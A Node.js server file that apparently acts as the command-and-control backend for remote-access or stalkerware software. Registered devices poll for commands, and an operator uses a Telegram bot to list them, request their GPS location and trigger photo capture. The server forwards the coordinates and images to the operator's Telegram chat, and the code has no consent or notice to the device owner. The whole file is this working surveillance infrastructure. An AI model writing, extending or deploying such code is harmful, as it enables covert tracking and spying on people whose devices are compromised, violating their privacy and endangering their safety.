const express = require('express');
const axios = require('axios');
const multer = require('multer');
const { Telegraf } = require('telegraf');
const http = require('http');
const webSocket = require('ws');
const telegramBot = require('node-telegram-bot-api');
const uuid4 = require('uuid');
const bodyParser = require('body-parser');
const fs = require('fs');

// Telegram bot setup
const token = "YOUR_TELEGRAM_BOT_TOKEN";
const bot = new Telegraf(token);
const appBot = new telegramBot(token, { polling: true });
const chatId = "YOUR_TELEGRAM_CHAT_ID";

// Express app setup
const app = express();
const port = process.env.PORT || 33223;
const upload = multer({ dest: 'uploads/' });

let devices = {};
let commands = {};

// Device registration
app.get('/register', (req, res) => {
    const deviceId = req.query.device_id;
    devices[deviceId] = true;
    res.send("Device registered");
});

// Get command for device
app.get('/get_command', (req, res) => {
    const deviceId = req.query.device_id;
    res.send(commands[deviceId] || "");
    commands[deviceId] = "";
});

// Send location to Telegram
app.get('/send_location', (req, res) => {
    const { device_id, lat, lon } = req.query;
    bot.telegram.sendMessage(chatId, `📍 Location from ${device_id}: https://maps.google.com/?q=${lat},${lon}`);
    res.send("Location sent");
});

// Send photo to Telegram
app.post('/send_photo', upload.single('photo'), (req, res) => {
    bot.telegram.sendPhoto(chatId, { source: req.file.path });
    res.send("Photo sent");
});

// WebSocket Server (Optional for real-time communication)
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
appSocket.on('connection', (socket) => {
    socket.on('message', (message) => {
        console.log('Received:', message);
        socket.send('Reply from server');
    });
});

// Express default route
app.get('/', (req, res) => {
    res.send('<h1 align="center">Server uploaded successfully</h1>');
});

// Telegram bot commands
bot.command('list', (ctx) => {
    let message = "Active Devices:\n";
    for (let device in devices) {
        message += `- ${device}\n`;
    }
    ctx.reply(message);
});

bot.command('get_location', (ctx) => {
    const deviceId = ctx.message.text.split(" ")[1];
    commands[deviceId] = "get_location";
    ctx.reply(`📍 Requested location from ${deviceId}`);
});

bot.command('take_photo', (ctx) => {
    const deviceId = ctx.message.text.split(" ")[1];
    commands[deviceId] = "take_photo";
    ctx.reply(`📸 Requested photo from ${deviceId}`);
});

bot.launch();

// Start the server
appServer.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
